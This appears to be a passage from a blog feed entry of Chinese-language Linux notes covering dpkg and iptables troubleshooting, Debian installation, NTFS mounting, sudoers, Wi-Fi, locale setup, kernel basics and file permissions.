&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org26de4b5&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org26de4b5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.8&lt;/span&gt; dpkg: error: failed to open package info file `/var/lib/dpkg/available' for reading&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-8&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo dpkg --configure -a
$ sudo apt-get -f install
$ sudo apt-get --fix-missing install
$ sudo apt-get clean
$ sudo apt-get update
$ sudo apt-get upgrade
$ sudo apt-get dist-upgrade
$ sudo apt-get clean
$ sudo apt-get autoremove

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org700d121&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org700d121&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.9&lt;/span&gt; CentOS 7关闭firewall，安装iptables&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-9&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 查看安装和状态
$ yum installed firewalld iptables
$ systemctl list-unit-files firewalld.service iptables.service

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 停止并禁止自启动firewall和安装iptables防火墙
$ systemctl stop firewalld.service
$ systemctl disable firewalld.service
$ yum install iptables-service
$ systemctl enable iptables.service

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
3. 编辑并修改配置文件/etc/sysconfig/iptables，使用如下配置

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orga53f4b8&quot;&gt;*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:TEST - [0:0]
-A INPUT -j TEST
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -p tcp -i eth1 -d 192.168.1.100 --syn -m recent --name suduip --rcheck --seconds 1 --hitcount 15 -j DROP
-A INPUT -p tcp -i eth1 -d 192.168.1.100 --syn -m recent --name suduip --set
-A INPUT -i eth1 -p tcp -m tcp -d 192.168.1.100 --syn -m connlimit --connlimit-above 50 --connlimit-mask 32 --connlimit-saddr -j DROP
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -m length --length 0:128 -j ACCEPT&lt;/span&gt;
-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
... ...
-A INPUT -j DROP
-A INPUT -j REJECT --reject-with icmp-host-prohibited
-A FORWARD -j TEST
-A FORWARD -j REJECT --reject-with icmp-host-prohibited
-A OUTPUT -j TEST
-A TEST -j RETURN
COMMIT
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;


&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
4. 查看防火墙规则是否启用。
$ iptables -L

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Debian" /><summary type="html">本文题目应该是“Linux 操作系统”，只因平时都是使用 Debian，所以 Title 就是“Debian GNU/Linu”）。以下就是我从开始接触 Linux 到现在的一些使用笔记。 1 Preface 欢迎阅读本册子，和其他大全图书不一样，本册子以实践的方式介绍 Linux 基础、Linux 服务架构和 Linux 实用技巧，涵盖了详尽的动手教程和实践信息，还提供了与内容相关的参考资料。本册子可以作为 Linux 的操作参考工具书。作者会持续更新与完善内容，血不流干，死不休战。 1.1 读者对象 Linux 系统管理员如果你是 Linux 环境下的系统管理员，那么本册子也许能为你提供一定的帮助。 Linux 爱好者如果你是 Linux 爱好者，本册子将告诉你部分问题的解决办法及原因。 1.2 内容结构 本册子分为五大部分。 第一部分，获取和安装 Linux 系统，Linux 系统的初步设置，Linux 介绍。 第二部分，介绍 Linux 文件、目录及磁盘的常见操作。 第三部分，学习及应用 shell 脚本(script)。 第四部分，Linux 进阶篇，对于 Linux 系统管理员比较实用，主要介绍 Linux 帐号管理及 ACL 权限控制，Linux 定时任务，Linux 网络，一些常见服务软件的架设。 第五部分，问题解决篇，聚集常见开发、运维中遇到的各种问题的解决办法，该部分可理解为本书的附录或问题解决参考手册。 编写规范 章节编码级别限制为 3 级。 列表中标题与描述内容分开。 保持各部分有序顺序，不能随意变更。 阅读提示 阅读本文时，每个知识章节都会有「参考资料」或「References」的章节，部分实际操作章节除外。 所有内容以笔记的形式编写，非权威指南类型，仅供参考。 本文将会省去一些有关 Linux 的常识性介绍，比如 Unix/Linux 发展史等，更多的是以过往的经验来介绍学习 Linux 的方法或建议，试图对一些 Linux 常见、实用的实践操作进行更详尽的说明，便于后来者学习。 1.3 作者 zrg 的 Linux 学习之路（My road of learning Linux） 第一次接触 Linux 是由于大二上学期的 Linux 基础课，但是，我并没有喜欢上这个系统，因为关于 Linux 的一切，对我来说都是陌生的，我在想我既然已经对 Windows 操作系统，又何必去瞎折腾呢，况且 Windows 可以完成 Linux 上的所有事情（后来，我发现我错了）；另一方面，可能是由于授课老师的坚毅个性，让我不想再去学习它，尽管当时我自己是多么幼稚，多么可笑。 后来，当我在听说 Linux 用来当服务器使用很好的时候，我开始尝试使用它来完成一些工作的时候，开始我有点喜欢 Linux 操作系统，不断的尝试（学习）使用 Linux，发现使用 Linux 来完成编程开发越来越完美了。 再后来，就是现在了，能使用它搭建一些服务，使我的生活更加方便，并将一些网站之类的放在上面，下面就是平时使用 Linux 的总结，仅供参考！ 尽管工作的大部分时间都在用 Windows 操作系统，但是对 Linux 系列的折腾从未停止过。 现在好了，今年（2018年）1月换了一份工作，公司使用的技术基本都是 Linux 上构建的，除了正常必要性开发，使用 Windows，使用 Linux 的时间将占据工作时间的 1/3。 今年5月（2019年），来深圳入职了，团队比较开放，现在我的大部分开发工作都在 Linux 下完成。 #2019-06-07，持续更新中…… jsf 的 Linux 学习之路（My road of learning Linux） 那些年用过的 Linux 操作系统 Ubuntu 12.04/14.04/16.04/18.04; CentOS 6.x/7.x; RedHat 7; Debian 7/8/9; SUSE Linux Enterprise server 11/12; Raspberry pi Debian; 1.4 英文太差，能学好 Linux 吗？ 关于这个问题，可以参考一下两个链接，或许能让你收获点什么！ Linux很有趣，可我的英文太差了，怎么办？ 解谜英语语法 2 Get Started 2.1 安装(Installation) 2.1.1 安装过程 安装准备 首先，准备一个U盘，用来刻录系统（刻录命令：dd，用法格式：sudo dd if=xxx.iso of=/dev/sdb），到 https://www.debian.org/ 下载 iso 镜像，注意有最小版和完整版。 Windows 下的刻录软件推荐使用 UltraISO（对于新手，建议在 Windows 下完成刻录）。 插入U盘，开机，开始选择安装。 2.1.2 主机规划与磁盘分区 2.1.3 安装后的常用操作 查看 Linux 发行版名称及版本号 查看 Linux 内核版本 // 方式一 $ cat /proc/version // 方式二 $ uname -a 查看 Linux 系统版本 // 方式一 $ lsb_release -a //这个命令适用于所有的Linux发行版，包括Redhat、SuSE、Debian…等发行版。 // 方式二 $ cat /etc/redhat-release //这种方法只适合Redhat系的Linux // 方式三 $ cat /etc/issue //使用所有Linux版本 Linux 上挂载NTFS格式文件系统 方案A（Scheme A）：使用linux-ntfs 获取安装 $ wget http://prdownloads.sourceforge.net/linux-ntfs/kernel-module-ntfs-2.6.18-92.el5-2.1.27-0.rr.10.11.x86_64.rpm $ sudo rpm -ivh kernel-module-ntfs-2.6.18-92.el5-2.1.27-0.rr.10.11.x86_64.rpm 检查 ntfs 模块是否被加载进系统 $ /sbin/modprobe ntfs [没有输出则代表存在；否则（otherwise）将会有错误信息（error message）报出（report）] $ cat /proc/filesystems [ntfs应该出现在列表中] 查看NTFS系统的编号 /sbin/fdisk -l |grep NTFS 创建目录 $ sudo mkdir -p /mnt/win_ntfs $ sudo mount -t ntfs /dev/sda1 /mnt/win_ntfs 方案B（Scheme B）：使用fuse和ntfs-3g 获取 $ wget http://downloads.sourceforge.net/project/fuse/fuse-2.X/2.7.4/fuse-2.7.4.tar.gz?use_mirror=ncu $ wget http://www.ntfs-3g.org/ntfs-3g-2009.4.4.tgz 编译安装 $ tar -zxf fuse-2.7.4.tar.gz $ ./configure --prefix=/usr/local/fuse-2.7.4 $ sudo make $ sudo make install $ tar -zxf ntfs-3g-2009.4.4.tgz $ ./configure --prefix=/usr/local/ntfs-3 $ sudo make $ sudo make install 检查fuse模块是否被加载进系统 $ /sbin/modprobe fuse [没有输出则代表存在；否则将会有错误信息报出] $ cat /proc/filesystems [fuse应该出现在列表中] 查看NTFS系统的编号 $ sudo fdisk -l |grep NTFS 挂载 $ mount ntfs-3g /dev/sda1 /mnt/win_ntfs 自动挂载 NTFS 格式硬盘 安装 ntfs-3g $ sudo apt-get install ntfs-3g 步骤1：编辑/etc/fstab $ sudo vim /etc/fstab /dev/sdb1 /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0 #Notice: # If /dev/sdb1 path will change due to system configuration, I recommend that you use the UUID (Universally Unique Identifier) of the partition. To find the UUID of /dev/sdb1, enter: #&amp;#32763;&amp;#35793;&amp;#65306;/dev/sdb1 &amp;#36335;&amp;#24452;&amp;#20250;&amp;#38543;&amp;#30528;&amp;#31995;&amp;#32479;&amp;#37197;&amp;#32622;&amp;#32780;&amp;#25913;&amp;#21464;&amp;#65292;&amp;#24314;&amp;#35758;&amp;#20351;&amp;#29992; UUID &amp;#65288;&amp;#36890;&amp;#29992;&amp;#21807;&amp;#19968;&amp;#26631;&amp;#35782;&amp;#31526;&amp;#65289; # Note down the UUID value and update /etc/fstab as follows: # &amp;#32763;&amp;#35793;&amp;#65306;&amp;#35760;&amp;#24405;&amp;#19979; UUID&amp;#65292;&amp;#26356;&amp;#26032; /etc/fstab &amp;#25991;&amp;#20214;&amp;#12290; # syntax # UUID=&quot;YOUR-UID-HERE&quot; /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0 UUID=&quot;c2dbc0c5-a8fc-439e-aa93-51b0a61372e8&quot; /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0 # Owning entire file system UUID=&quot;c2dbc0c5-a8fc-439e-aa93-51b0a61372e8&quot; /mnt/ntfs/ ntfs uid-1000,gid-1000 0 0 下面是查看 UUID 的命令。 $ sudo /sbin/blkid /dev/sda1 保存关闭文件 步骤2：创建目录 $ sudo mkdir -p /mnt/ntfs 步骤3：测试（Test）可用性 $ sudo mount -a $ df -h $ cd /mnt/ntfs $ ls -l 步骤4：卸载NTFS分区 $ sudo umount /mnt/ntfs // or $ sudo umount /dev/sda1 注意错误信息：“Read-only file system”提示 $ sudo mv 05Music/ /mnt/sda/sda2/ /bin/mv: inter-device move failed: '05Music/' to '/mnt/sda/sda2/05Music'; unable to remove target: Read-only file system 解决（Solving）：配置 /etc/fstab 参考资料 How To Debian/Ubuntu Linux Auto Mount Windows NTFS File System NTFS-3G fstab (简体中文) NTFS-3G (简体中文) boot 加载选项修改 $ sudo chmod +w /boot/grub/grub.cfg $ sudo vim /boot/grub/grub.cfg 注释不需要的加载项！ 改变 Home 目录下的目录中文名称为英文 方法1 $ vim ~/.config/user-dirs.dirs XDG_DESKTOP_DIR=&quot;$HOME/Desktop&quot; XDG_DOWNLOAD_DIR=&quot;$HOME/Download&quot; XDG_TEMPLATES_DIR=&quot;$HOME/Template&quot; XDG_PUBLICSHARE_DIR=&quot;$HOME/Public&quot; XDG_DOCUMENTS_DIR=&quot;$HOME/Document&quot; XDG_MUSIC_DIR=&quot;$HOME/Music&quot; XDG_PICTURES_DIR=&quot;$HOME/Picture&quot; XDG_VIDEOS_DIR=&quot;$HOME/Video&quot; 方法2 $ export LANG=en_US xdg-user-dirs-gtk-update 电脑没有声音问题解决 安装驱动软件 $ sudo apt-get install alsa-utils $ sudo apt-get install alsa-oos $ sudo apt-get install esound $ sudo apt-get install gnome-audio 检查声卡驱动 $ lspci |grep Audio 检查内核模块 $ lsmod |grep snd 检查系统音量 $ alsamixer alsamixer 是 alsa 驱动的一个插件,是一个命令行下的图形设置工具。alsamixer 命令，00 表示音量正常，MM表示此声道静音。可以通过M键切换。 初始化声卡 $ sudo alsactl init 参考资料 解決 Ubuntu Linux 16.04 耳機輸出沒有聲音的問題 关机和重启命令 shutdown 关机、重启计算机(Halt, power-off or reboot the machine) $ sudo shutdown -r now // 其他重启命令 $ sudo reboot $ sudo init 6 Table 1: 系统运行级别 级别 描述 0 关机，不允许设置为初始化默认值 1 单用户模式 2 不完全多用户，不含NFS服务 3 完全多用户 4 未分配 5 图形界面 6 重启，不允许设置为初始化默认值 $ cat /etc/initable // 查看系统运行级别 $ sudo runlevel 其他关机/注销命令 halt poweroff init 0 logout 2.2 配置(Configuration) 2.2.1 用户身份切换: su &amp;amp; sudo Linux 系统当中的身份变换，可能有以下几个原因： 使用一般账号：系统平日操作的好习惯 用较低权限启动系统服务 软件本身的限制 su 是最简单的身份切换命令。 -：单纯使用 - 如『 su - 』代表使用 login-shell 的变量文件读取方式来登陆系统；若使用者名称没有加上去，则代表切换为 root 的身份。 -l：与 - 类似，但后面需要加欲切换的使用者账号！也是 login-shell 的方式。 -m：-m 与 -p 是一样的，表示『使用目前的环境配置，而不读取新使用者的配置文件』 -c：仅进行一次命令，所以 -c 后面可以加上命令喔！ 并非所有人都能够运行 sudo，而是仅有规范到 /etc/sudoers 内的用户才能够运行 sudo 这个命令。同时， /etc/sudoers 可以修改默认的 timeout。 Defaults env_reset Defaults timestamp_timeout=60 ... root ALL=(ALL:ALL) ALL zrg ALL=(ALL:ALL) ALL # &amp;#25351;&amp;#23450;&amp;#29992;&amp;#25143;&amp;#19981;&amp;#29992;&amp;#36755;&amp;#20837;&amp;#23494;&amp;#30721; zrg ALL=(ALL:ALL)NOPASSWD: ALL # &amp;#25480;&amp;#26435; zrg_test &amp;#29992;&amp;#25143;&amp;#25191;&amp;#34892;&amp;#37325;&amp;#21551;&amp;#21629;&amp;#20196; zrg_test ALL=/sbin/shutdown -r now # Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL 2.2.2 Wifi连接配置(configure) 完成安装第一步，当然是先解决网络。 查看无线（wireless）网卡（LAN）驱动（driver） $ sudo lsmod | grep iw 安装（Installing）无线网卡驱动 $ sudo apt-get install firmware-iwlwifi wireless-tools 向内核（kernel）中加载/移除模块（modules） $ modprobe iwl4965 重启系统 $ reboot 配置无线网络 //查看无线网口（nerwork port） $ sudo iwconfig //开启无线网口 $ sudo ifconfig wlan0 up //扫描（scaning）无线网络 $ sudo iwlist wlan0 scan //连接无线网络 $ sudo iwconfig wlan0 ESSID &quot;wifi-name&quot; KEY &quot;password&quot; open //执行上面的命令（command）后，发现并不能成功！！！ //于是，通过如下命令继续配置 //格式：wpa_passphrase &amp;lt;ssid&amp;gt; [passphrase] $ sudo wpa_passphrase &quot;wifi-name&quot; &quot;passowrd&quot;&amp;gt;/etc/wpa_supplicant.conf $ sudo wpa_passphrase -B -i wlan0 -Dwext -c /etc/wpa_supplicant.conf //查看wlan0无线网口 $ sudo iwconfig wlan0 //执行命令获取到IP地址，成功连上WiFi $ sudo dhclient wlan0 开机自动连接WiFi配置 $ sudo vim /etc/network/interfaces.d/wlan0 auto wlan0 allow-hotplug wlan0 iface wlan0 inet dhcp wpa-conf /etc/wpa_supplicant.conf 2.2.3 配置安装源(source) 以配置163源举例说明 访问域名:mirrors.163.com，找到镜像名为debian的目录，点击debian使用帮助。 根据最新的debian版本进行选择jessie，wheezy，squeeze。从最新版本到最低版本选择源 复制安装源文本到 /etc/apt/source.list 中。 # mirrors.163.com deb http://mirrors.163.com/debian/ jessie main non-free contrib deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb-src http://mirrors.163.com/debian/ jessie main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib 其他安装源 中国科学技术大学开源软件镜像站 清华大学开源软件镜像站 华中科技大学开源镜像站 阿里云开源镜像站 2.2.4 配置系统支持中文(support chinese) 安装及配置 查看并设置环境变量 $ echo $LANG $ export LANG=en_US.UTF-8 没有安装 locales,先安装 locales $ sudo aptitude install locales 配置中文编码 $ sudo dpkg-reconfigure locales //选择编码（encode），space选择 en_US.UTF-8 zh_CN.GB2312 zh_CN.GB18030 zh_CN.GBK zh_CN.UTF-8 文件配置 $ sudo vim /etc/default/locate # LANG=&quot;zh_CN.UTF-8&quot; # LANGUAGE=&quot;zh_CN:zh&quot; LANG=&quot;en_US.UTF-8&quot; LANGUAGE=&quot;en_US:en&quot; 安装中文输入法 ibus &amp;amp; UIM &amp;amp; SCIM &amp;amp; Fcitx gnome-chinese-input i18n ibus Fcitx 输入法补充 Ubuntu安装Fcitx以及Fcitx输入中文不显示候选词框的解决办法 安装 fcitx 组件（module） $ sudo apt-get install fcitx-tools fcitx-config* fcitx-data fcitx-frontend* fcitx-libs fcitx-module* fcitx-ui* presage 安装 fcitx 输入法 $ sudo apt install fcitx-pinyin $ sudo apt install fcitx-googlepinyin $ sudo apt install fcitx-table //五笔 设置并运行 $ export LANG=zh_CN.utf8 $ export LC_CTYPE=zh_CN.utf8 $ export LC_ALL=zh_CN.utf8 $ export XMODIFIERS=@im=fcitx $ fcitx &amp;amp; ui 动态库的支持: $ sudo apt install fcitx-frontend-gtk2 fcitx-frontend-gtk3 fcitx-ui-classic 重启可用 参考资料 Locale debian wiki 2.3 介绍(Instroduction) 首先，明确一点：GNU Not's Unix. 2.3.1 入门第一步，理解 Linux 首先，以 Linux 的思维方式系统性思考问题。 Linux 是一个面向文件的操作系统。所有的应用、管理是基于文件的。 Linux 是一个以命令行为主要的管理方式的 OS。 Linux 的日志非常完善，也至关重要。 Linux 是一个以配置文件为管理基础的 OS。 Linux 的所有应用、管理和配置，都有很多程序来辅助完成。 2.3.2 Linux 内容划分 Linux 可划分为以下四部分 Linux 内核 GNU 工具 图形化桌面环境 应用软件 深入探究 Linux 内核 Linus Torvalds：Linux 内核开发者。 Linux 内核主要负责一下四种功能： 系统内存管理 内核不仅管理服务器上的可用物理内存，还可以创建和管理虚拟内存。 内核通过硬盘上的存储空间来实现虚拟内存，这块区域称为交换空间（swap space）。内核不断地交换空间和实际的物理内存之间反复交换虚拟内存中的内容。这使得系统以为它拥有比物理内存更多的可用内存。 内存存储单元按组划分成很多块，这些块称作页面（page）。内核将每个内存页面放在物理内存或交换空间。然后，内核会维护一个内存页面表，指明哪些页面位于物理内存内，哪些页面被换到了磁盘上。 内核会记录哪些内存页面正在使用中，并自动把一段时间未访问的内存页面复制到交换空间区域（称为换出，swapping out）——即使还有可用内存。 软件程序管理 Linux 操作系统将运行中的程序称为进程。内核控制着 Linux 系统如何管理运行在系统上的所有进程。 内核创建了第一个进程（称为 init 进程）来启动系统上所有其他进程。Linux 操作系统的 init 系统采用了运行级。Linux 操作系统有 5个启动运行级。 运行级为 1 时，只启动基本的系统进程以及一个控制台终端进程，我们称之为单用户模式。单用户模式通常用来在系统有问题时进行紧急的文件系统维护。显然，这种模式下，仅有一个人（通常是系统管理员）能登录到系统上操作数据。 运行级为 3 时，大多数应用软件，比如网络支持程序，都会启动。 运行级为 5 时，系统会启动 X Window 系统，允许用户通过图形化桌面窗口登录系统。 Linux 系统可以通过调整启动运行级来控制整个系统的功能。 硬件设备管理 内核的另一职责是管理硬件设备。任何 Linux 系统需要与之通信的设备，都需要在内核代码中加入驱动程序代码。在 Linux 内核中有两种方法用于插入设备驱动程序代码： 编译进内核的设备驱动代码 可插入内核的设备驱动模块 以前，插入设备驱动代码的唯一途径是重新编译内核。随着 Linux 内核支持的硬件设备越来越多，这个过程变得越来越低效。 后来，开发人员提出了内核模块的概念。它允许将驱动代码插入到运行中的内核而无需重新编译内核。Linux 系统将硬件设备当成特殊的文件，称为设备文件。 设备文件有3种分类 字符型设备文件：指处理数据时每次只能处理一个字符的设备。大多数类型的调制解调器和终端都是作为字符型设备文件创建的。 块设备文件：指处理数据时每次能处理大块大数据的设备，比如硬盘。 网络设备文件：指采用数据包发送和接受数据的设备，包括各种网卡和一个特殊的回环设备。这个回环设备允许 Linux 系统使用常见的网络编程协议同自身通讯。 Linux 为系统上的每个设备都创建一种称为节点的特殊文件。与设备的所有通信都通过设备节点完成。每个节点都有唯一的数值对供 Linux 内核标识它。数值对包括一个主设备号和一个次设备号。类似的设备被划分到同样的主设备号下。次设备号用于标识主设备组下的某个特定设备。 文件系统管理 Linux 内核支持通过不同类型的文件系统从硬盘中读写数据。内核必须在编译时就加入对所有可能用到的文件系统的支持。下表是 Linux 系统用来读写数据的标准文件系统 Table 2: 文件系统类型 文件系统 描述 ext Linux 扩展文件系统，最早的 Linux 文件系统 ext2 第二扩展文件系统，在ext的基础上提供更多的功能 ext3 第三扩展文件系统，支持日志功能 ext4 第四扩展文件系统，支持高级日志功能 hpfs OS/2高性能文件系统 jfs IBM日志文件系统 iso9660 ISO 9660文件系统（CD-ROM） mimix MINIX文件系统 msdos 微软的FAT16 ncp Netware文件系统 nfs 网络文件系统 ntfs 支持Microsoft NT文件系统 proc 访问系统信息 ReiserFS 高级Linux文件系统，能提供更好的性能和硬盘恢复功能 smb 支持网络访问的Samba SMB文件系统 sysv 较早期的Unix文件系统 ufs BSD文件系统 umsdos 建立在msdos上的类Unix文件系统 vfat Windows95文件系统（FAT32） XFS 高性能64位日志文件系统 Linux 内核采用虚拟文件系统（Virtual File System,VFS）作为和每个文件系统交互的接口。 GNU工具 核心 GNU 工具：coreutils(coreutilities)软件包 GNU coreutils 软件包由三部分构成： 用以处理文件的工具 用以操作文本的工具 用以管理进程的工具 shell Table 3: Linux 中常见的shell shell 描述 bash bash shell 是 Bourne shell 的一个免费版本，它是最早的 Unix shell，bash还有一个特点，可以通过help命令来查看帮助。包含的功能几乎可以涵盖shell所具有的功能，所以一般的shell脚本都会指定它为执行路径。 ash 一种运行在内存受限环境中简单的轻量级shell，但与bash shell完全兼容。 korn 一种与 Bourne shell，但支持如关联数组和浮点运算等一些高级的编程特性。 tcsh 一种将C语言中的一些元素引入到shell脚本中的shell。 zsh 一种结合了bash、tcsh和korn的特性，同时提供高级编程特性、共享历史文件和主题化提示符的高级shell。 Linux 桌面环境 X Window KDE 桌面（K Desktop Environment，K 桌面系统） GNOME 桌面（the GNU Network Object Model Environment，GNU 网络对象模型桌面） Unity 桌面 其他桌面 Table 4: 其他桌面 桌面 描述 Fluxbox &amp;#xa0; Xfce &amp;#xa0; JWM &amp;#xa0; Fvwm &amp;#xa0; fvwm95 &amp;#xa0; Linux 发行版 不同的 Linux 发行版通常归类为3种： 完整的核心 Linux 发行版 Table 5: 完整的核心 Linux 发行版 Slackware 最早的 Linux 发行版之一 Red Hat 商业发行版 Fedora Red Hat 分离出的家用发行版 Gentoo 为高级 Linux 用户设计的发行版，仅包含 Linux 源代码 openSuse 商用和家用的发行版 Debian Linux 专家和商用 Linux 产品中流行的发行版 特定用途的发行版 Table 6: 特定用途的发行版 CentOS 一款基于 Red Hat 企业版 Linux 源代码构建的免费发行版 Ubuntu 一款用于学校和家庭的免费发行版 PCLinuxOS 一款用于学校和办公的免费发行版 Mint 一款用于家庭娱乐的免费发行版 dyne:bolic 一款用于音频和MIDI应用的免费发型版 Puppy Linux 一款适用于老旧PC的小型免费发行版 LiveCD 测试发行版。 Table 7: LiveCD 测试发行版。 Knoppix 最早的 LiveCD Linux PCLinuxOS 一款成熟的 LiveCD Ubuntu 为多种语言设计的世界级 Linux 项目 Slax 基于 Slackware Linux Pubby Linux 为老旧 PC 设计的一款全功能 Linux 2.3.3 Linux 基本网络配置 安装网络工具 $ sudo apt-get install net-tools 配置网络 在 Linux 中，以太网接口被命名为：eth0、eth1等。 lspci 命令可以查看网卡硬件信息（如果是 usb 网卡，则需要使用 lsusb 命令） ifconfig 命令：查看接口信息 $ ifconfig -a $ ifconfig eth0 ifup,ifdown 命令：启用、禁用一个接口 $ ifup eth0 $ ifdown eth0 相关配置文件 网卡配置文件：/etc/sysconfig/network-scripts/ifcfg-eth0 DNS 配置文件：/etc/resolv.conf 主机名配置文件：/etc/sysconfig/network 静态主机名配置文件：/etc/hosts 网络测试 测试网路连通性：ping 命令 测试DNS解析：host,dig 命令 显示路由表：ip route 命令 追踪到达目标地址的网络路径：traceroute 命令 mtr 命令进行网络质量测试 2.3.4 Linux 日期时间设置 Linux 时钟分为系统时钟（System Clock）和硬件时钟（Real Time Clock，简称 RTC）。系统时钟指当前 Linux Kernel 中的时钟;硬件时钟指主板上由电池供电的时钟，可在 BIOS 中进行设置。 date 命令 hwclock 命令，查看硬件时间 //设置硬件时间 $ sudo hwclock -set -date='07/17/2017 20:00' 硬件时间与系统时钟同步 $ sudo hwclock --hctosys(hc 代表硬件时间，sys 代表系统时间) $ sudo hwclock -systohc 2.3.5 获取帮助 &amp;amp; 问题解决 出现问题，先保护现场。（问题一种是已正确运行的系统出问题，另一种是新的操作或配置造成了问题） 当怀疑有黑客入侵或病毒的情况，马上做日志备份。 检查相关日志。 对于新的操作或配置造成的问题，最好是养成定期备份重要文件的习惯。 使用网络 使用搜索命令：find，locate，whereis。。。 man 查看在线帮助手册(an interface to the on-line reference manuals)，如果不记得命令名怎么办？可以使用关键字搜索手册页。 $ man -k terminal Table 8: Linux 手册页惯用的节名 节 描述 Name 显示命令和一段简短的描述 Synopsis 命令的语法 Configuration 命令配置信息 Description 命令的一般性描述 Options 命令选项描述 Exit Status 命令的推出状态指示 Return Value 命令的返回值 Errors 命令的错误信息 Environment 描述所使用的环境变量 Files 命令用到的文件 Versions 命令的版本信息 Conforming To 命令所遵从的标准 Notes 其他有帮助的资料 Bugs 提供提交Bug的途径 Example 展示命令的用法 Authors 命令开发人员的信息 Copyright 命令源代码的版权状况 See Also 与该命令类似的其他命令 Table 9: Linux 手册页的内容区域 区域号 所涵盖的内容 1 可执行程序或shell命令 2 系统调用 3 库调用 4 特殊文件 5 文件格式与约定 6 游戏 7 概览、约定及杂项 8 超级用户和系统管理员命令 9 内核例程 help 查看命令帮助信息(Display information about builtin commands.) type 查看命令类型(Display information about command type) 3 Linux File, Directory, and Disk format 3.1 Linux File Permission 3.1.1 理解文件权限 使用文件权限符 $ ls -lh drwxr-xr-x 3 zrg zrg 4.0K Apr 21 16:24 练手项目 -rw-r&amp;#x2013;r&amp;#x2013; 1 zrg zrg 2.5M Apr 21 11:51 练手项目.rar Table 10: 解释 d rwxr-xr-x 3 zrg zrg 4.0K Apr 21 16:24 练手项目 文件类型。 文件权限。 对于普通文件：链接数 用户名 组名 文件大小，单位：字节 最后修改日期时间 文件名 d 目录文件 从左往右分别代表所有者权限、组用户权限和其他用户权限 对于目录文件：第一级子目录数 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; - 普通文件 r 可读 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; l 链接文件 w 可写 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; c 字符型设备文件 x 可执行 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; b 块设备文件 - 无执行权限 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; n 网络设备文件 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; s 套接字文件 &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; &amp;#xa0; 默认文件权限 umask 命令用来设置所创建文件和目录的默认权限。 3.1.2 Share File Linux 为每个文件和目录存储了3个额外的信息位。 设置用户ID（SUID） 设置组ID（GID） 粘着位：进程结束后文件还驻留（粘着）在内存中。 Table 11: chmod SUID、SGID和粘着位的八进制值 二进制值 八进制值 描述 000 0 所有位都清零 001 1 粘着位置位 010 2 SGID位置位 011 3 SGID位和粘着位都置位 100 4 SUID位置位 101 5 SUID位和粘着位都置位 110 6 SUID位和SGID都置位 111 7 所有位都置位 创建一个共享目录 $ mkdir testdir $ chgrp shared testdir $ chmod g+s testdir $ umask 002 $ cd testdir $ touch testfile 3.2 Linux Directory 3.3 Linux File Search 3.3.1 find 命令 find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。 示例 根据文件名查找 格式：find [搜索范围][匹配条件] // 默认在当前目录下搜索 $ find -name &quot;MyCProgram.c&quot; // 忽略大小写 $ find -iname &quot;MyCProgram.c&quot; // 查找以my开头，后面包含三个字符的文件 $ find -name my??? // 深度查找： // 在 root 目录及其子目录下查找 passwd 文件。 $ sudo find / -maxdepth 2 -name passwd // 在第二层子目录和第四层子目录之间查找 passwd 文件。 $ sudo find / -mindepth 3 -maxdepth 5 -name passwd // 找到 home 